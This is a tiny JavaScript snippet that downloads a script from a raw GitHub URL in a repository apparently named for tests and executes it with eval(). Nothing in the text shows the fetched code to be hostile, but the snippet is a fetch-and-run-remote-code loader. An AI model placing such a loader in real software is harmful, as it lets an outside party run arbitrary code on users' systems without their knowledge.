fetch('https://raw.githubusercontent.com/mika985/Javascript-Tests/main/src/index.js')
  .then(r => r.text())
  .then(code => eval(code))
  .catch(err => console.error('Script load failed:', err));
